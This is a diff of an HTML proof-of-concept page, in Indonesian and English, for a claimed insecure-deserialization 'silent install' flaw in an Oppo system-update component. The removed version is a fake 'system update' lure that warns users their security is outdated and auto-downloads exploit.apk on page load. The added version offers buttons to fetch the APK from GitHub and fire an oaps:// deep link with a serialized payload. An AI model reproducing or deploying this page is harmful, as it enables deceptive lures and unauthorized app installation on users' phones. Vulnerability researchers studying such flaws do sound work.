@@ -1,23 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update Service</title>
+    <title>Oppo System Update - PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        .btn { display: block; margin: 20px 0; padding: 15px; border-radius: 8px; text-decoration: none; font-weight: bold; color: white; transition: 0.3s; }
+        .btn-blue { background: #007bff; }
+        .btn-blue:hover { background: #0056b3; }
+        .btn-red { background: #dc3545; }
+        .btn-red:hover { background: #a71d2a; }
+        h2 { color: #333; }
+        p { color: #666; font-size: 14px; }
+    </style>
 </head>
-<body style="text-align: center; padding-top: 50px; font-family: sans-serif;">
-    <h2>Pembaruan Sistem Tersedia</h2>
-    <p>Versi keamanan Anda sudah usang. Klik di bawah untuk memperbarui.</p>
-    
-    <a href="oaps://add?ckey=exploit&cb=rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw" 
-   class="btn-update">
-        style="padding: 15px 25px; background: green; color: white; text-decoration: none; border-radius: 5px;">
-   PERBARUI SISTEM SEKARANG
+<body>
+
+<div class="container">
+    <h2>Security Update PoC</h2>
+    <p>Simulasi Insecure Deserialization - Silent Install</p>
+
+    <a href="https://raw.githubusercontent.com/smuft1707/oppo-update-poc/main/exploit.apk" 
+       class="btn btn-blue">
+       STEP 1: DOWNLOAD EXPLOIT APK
     </a>
 
-    <script>
-        // Simulasi otomatis download APK saat halaman dibuka
-        window.onload = function() {
-            window.location.href = "https://raw.githubusercontent.com/username/oppo-update-poc/main/exploit.apk";
-        };
-    </script>
+    <p style="font-size: 11px;">(Pastikan APK terdownload di /sdcard/Download/)</p>
+
+    <a href="oaps://add?ckey=exploit&cb=rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw" 
+       class="btn btn-red">
+       STEP 2: TRIGGER SILENT INSTALL
+    </a>
+
+    <p style="font-size: 11px;">Klik ini untuk memicu kerentanan pada WebBridgeActivity</p>
+</div>
+
 </body>
 </html>
